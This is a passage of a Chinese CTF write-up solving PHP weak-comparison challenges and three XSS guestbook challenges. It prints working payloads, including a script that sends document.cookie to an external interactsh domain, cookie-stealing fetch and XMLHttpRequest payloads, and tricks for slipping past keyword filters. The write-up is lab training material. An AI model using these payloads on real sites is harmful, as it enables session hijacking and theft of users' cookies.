    exit("no");
}

?>
```

> **is_numeric**
>
> 作用：检测变量是否是数字或数字字符串。

实现 `if($a and $a==0)` 为真可以利用 PHP 若比较，比如传入：

```http
?a=0abcd
```

实现 ` if(is_numeric($b))` 为假，且 `if($b>2026)` 为真，可以传入：

```http
?a=0abcd&b=2027abcd
```

## EZPHP_1

```php
<?php
show_source(__FILE__);
include("flag.php");
if (!isset($_GET['qc']) || $_GET['qc'] === '') exit("no");
$qc = (array)json_decode($_GET['qc'], true);
$key = array_search("QCCTF", $qc);
if($key === 1){
    echo $flag;
}else{
    exit("no");
}

?>
```

> **(array)json_decode**
>
> 作用：`json_decode($json, true)` 会将 JSON 格式的字符串解码为 PHP 的关联数组（因第二个参数为 `true`）。前面的 `(array)` 是一种强制类型转换机制，确保无论 `json_decode` 返回什么类型（例如解析失败返回 `null`，或者解析出单纯的字符串/数字），最终都会被强转为数组类型（如 `[0 => ""]`），从而避免后续处理数组的函数发生报错。

> **array_search**
>
> 作用：在数组中搜索给定的值，如果成功则返回首个相应的键名。
>
> 注意点：该函数的第三个参数 `$strict` 默认值为 `false`，即默认进行弱类型比较（`==`）。

可以传入 JSON 数组：

```http
?qc=["xixi", "QCCTF"]
```

经解析后，在 PHP 内部，这个数组实际上变成了这样：

```php
[
    0 => "xixi",
    1 => "QCCTF"
]
```

`array_search` 会遍历这个数组去寻找 `"QCCTF"` 这个值，然后返回它对应的键名 `1` 。

或者使用 JSON 对象格式指定键值：

```http
?qc={"1":"QCCTF"}
```

或者利用弱类型比较绕过（适用于 PHP < 8.0）：

```http
?qc={"1":0}
```

## EZPHP_2

```php
<?php
show_source(__FILE__);
include("flag.php");
if (!isset($_GET['qc']) || $_GET['qc'] === '') exit("no");
$qc = (array)json_decode($_GET['qc'], true);
if (!isset($qc["n"]) || !is_array($qc["n"]) || empty($qc["n"])) die("no");
if (array_search("QCCTF", $qc) === false) die("no...");
if (array_search("QCyyds", $qc["n"]) === false) die("no...");
foreach ($qc["n"] as $val) {
    if ($val === "QCyyds") die("no......");
}
echo $flag;  
```

> **is_array**
>
> 作用：判断变量是否为数组。

> **empty**
>
> 作用：判断变量是否为空。常见的空值有 `""`、`0`、`"0"`、`null`、`false`、`[]` 等。

> **foreach**
>
> 作用：遍历数组中的每一个值。

可以传入：

```http
?qc={"n":[true],"a":true}
```

或：

```http
?qc={"n":[true],"a":"QCCTF"}
```

1. 传入 `?qc={"n":[true],"a":true}` 是一个 JSON 格式，方便后续控制转换。

2. 传入 `"n":[true]` 实现 `!isset($qc["n"]) || !is_array($qc["n"]) || empty($qc["n"])` 为假，即 `n` 存在，是数组，而且不为空。

   且传入 `"n":[true]` 实现 `array_search("QCyyds", $qc["n"])` 为真，因为在 PHP 里，**非空字符串和 `true` 弱比较时，会被当成 true** ，即 `"QCyyds" == true` 成立。

   且传入 `"n":[true]` 实现 `$val === "QCyyds"` 为假，因为这里是强比较， `true === "QCyyds"` 不成立。

3. 传入 `"a":true` 或 `"a":"QCCTF"` 实现 `(array_search("QCCTF", $qc)` 为真。

## EZXSS

点击进入留言板，测试一下

```html
<h1>test</h1>
```

回显出一个`test`的一级标题，证明可以注入 HTML 。

输入

```html
<script>alert('111')</script>
```

弹出窗口显示 `111` ，证明存在 XSS 。

估计是要拿 Cookie ，页面提示：

```txt
留言将经管理员审核后公开展示。
```

猜测后台的管理员 Bot 会访问带有恶意 JS 的链接。

先和 XXE 一样，在命令行拿个 interactsh 域名：

```bash
# 下载
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
# 运行
~/go/bin/interactsh-client -v
```

得到类似 `d7md06dt5p5pl9ldceb0zy1euw6hwcmi4.oast.pro` 。

在留言板输入：

```html
<script>  
    var img = document.createElement("img");     
    img.src = "http://d7md06dt5p5pl9ldceb0zy1euw6hwcmi4.oast.pro/"+document.cookie
</script>
```

终端确实有回显，但没有拿到 Cookie ，说明管理员 Bot 可能不能出网，放弃外带数据。

不能外连，但发现站内有可写可见的地方，可以尝试写回站内。由于上传的留言是 POST 传参 `content=` ，输入：

```html
<script>
var data = "content=" + document.cookie;

fetch("/guestbook", {
    method: "POST",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    body: data
});
</script>
```

没有响应，说明 `document.cookie` 里**很可能包含了会破坏表单格式的特殊字符**，不编码时后端收不到完整的 `content` ，比如 `&`、`=`、`+`、`%` 都有特殊含义。

用 `encodeURIComponent` 把字符串里的特殊字符转成 `%xx` 形式，防止它们破坏 URL 或表单参数结构。重新输入：

```html
<script>
var data = "content=" + encodeURIComponent(document.cookie);

fetch("/guestbook", {
    method: "POST",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    body: data
});
</script>
```

得到 flag 。

## EZXSS_1

沿用上题的 payload ，返回 `含有非法内容` ，经测试过滤了 `script` ，可以用其他标签替代：

```html
<img 
	src=x 
    onerror="fetch('/guestbook',{
		method:'POST',
		headers:{'Content-Type':'application/x-www-form-urlencoded'},
		body:'content='+encodeURIComponent(document.cookie)})"
>
```

但仍然返回 `含有非法内容` ，经测试，不仅过滤了 `img` ，还过滤了 `body` ，应该是防 `<body>` 标签。

先测试一下哪些标签能用吧：

```txt
script
img
input 
svg
iframe
body
```

经测试 `input` 、 `svg` 、 `iframe` 都能用，使用 XMLHttpRequest 替代 fetch 绕过 `body` ，改成输入：

```html
<svg onload="
    var xixi = new XMLHttpRequest();
    xixi.open('POST', '/guestbook');
    xixi.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xixi.send('content=' + encodeURIComponent(document.cookie));
">
```

也可以仍然使用 fetch ，利用属性名拼接绕过 `body` 限制：

```html
<svg onload="
	fetch('/guestbook',{
	method:'POST',
	headers:{'Content-Type':'application/x-www-form-urlencoded'},
	['bo' + 'dy']:'content='+encodeURIComponent(document.cookie)})
">
```

没拿到 flag 就多发几次就行了。

## EZXSS_2

沿用上题 payload ，发现过滤了 `svg + 空格 + 其他字符` ，空格可以用`%09`、`tab`、`/`、`/**/`代替，输入：

```html
<svg/onload="
	fetch('/guestbook',{
	method:'POST',
	headers:{'Content-Type':'application/x-www-form-urlencoded'},
	['bo' + 'dy']:'content='+encodeURIComponent(document.cookie)})
">
```

仍然返回 `含有非法内容` ，经测试 `'bo' + 'dy'` 会触发 `含有非法内容` ，但 `'bo'+'dy'` 不会，不太懂，重新输入：

```html
<svg/onload="
	fetch('/guestbook',{
	method:'POST',
	headers:{'Content-Type':'application/x-www-form-urlencoded'},
	['bo'+'dy']:'content='+encodeURIComponent(document.cookie)})
">
```

仍然返回 `含有非法内容` ，不知道咋过滤的，但是把 payload 换成一行就可以过了，输入：

```html
<svg/onload="fetch('/guestbook',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},['bo'+'dy']:'content='+encodeURIComponent(document.cookie)})">
```

没拿到 flag 就多发几次就行了。

